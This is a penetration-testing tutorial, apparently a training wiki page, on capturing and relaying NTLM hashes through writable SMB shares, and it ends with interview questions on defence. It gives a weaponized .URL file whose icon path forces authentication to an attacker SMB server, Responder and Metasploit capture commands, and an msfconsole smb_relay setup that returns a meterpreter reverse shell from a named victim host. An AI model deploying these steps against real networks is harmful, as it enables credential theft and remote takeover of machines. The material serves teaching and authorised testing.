# NTLM Relay via SMB

SMB is a protocol which is widely used across organisations for file sharing purposes. It is not uncommon during internal penetration tests to discover a file share which contains sensitive information such as plain-text passwords and database connection strings.&#x20;

However even if a file share doesn’t contain any data that could be used to connect to other systems but it is configured with write permissions for unauthenticated users then it is possible to obtain passwords hashes of domain users or Meterpreter shells.

Let's walk through the example of using url links

## Execution via .URL

Create a weaponized .url file and upload it to the victim system:

```
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\192.168.0.37\%USERNAME%.icon
IconIndex=1
```

Create a listener on the attacking system:

```
responder -I eth1 -v
```

There are alternative way to Responder, Metasploit Framrwork has a module can be used to capture challenge-response password hashs from SMB Clients

```
auxiliary/server/capture/smb
```

Once the victim access the fileshare, the OS tries to authenticate to the attacker's malicious SMB listener on **192.168.0.37**. NTLMv2-SSP hash will be sent and capture.

<figure><img src="../.gitbook/assets/image (52).png" alt=""><figcaption><p>Responder</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (56).png" alt=""><figcaption><p>Metasploit smb capture</p></figcaption></figure>

Next we can proceed to crack this NTLMv2-SSP hash using john

<figure><img src="../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

## Why does it auto authenticates?

When parsing a shortcut, Windows reads the contents to determine the properties of the shortcut, including where the linked resource is what and what icon should represent it.

If the .URL files specifies an icon file located on a network resource (Above example), Windows will attempt to access the network location to retrieve the icon. This is where the automatic behaviour comes into play:

* Network Request: Windows makes a network request to the specified server (attacker smb server).
* Authentication: Since its a network resources, Windows will try to authenticate to the server using available credentials. This is typically handled using **NTLM authentication if kerberos is not configured.**
* Once the icon is retrieved, it is displayed in the shortcut's place in the file explorer.

## More relays

Let's assume we have 2 machines, victim1 user is able authentication to victim2 machine.

We can relay the victim1 hash to victim2 and return a meterpreter shell.

Firstly launch msfconsole

```
use exploit/windows/smb/smb_relay
set payload windows/x64/meterpreter/reverse_tcp
set relay_targets 192.168.0.50 --victim2
set smbdomain cyberrange.com
set smbshare public --victim2 writable share
exploit
```

after victim1 open up the malicious url shares, it will use the hash&#x20;

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

## Author

Ik0nw



## Interview Question

1\) Other than abusing the .URL, any other methods that enable force authentication to smb&#x20;

2\) What are the ways to defend smb relay attacks

3\) Explain why do the victim able to automatically access the attacker's smb share just by opening the share?

4\) How do defend such attacks

5\) Do smbrelay able to relay the hash back to the victim itself?
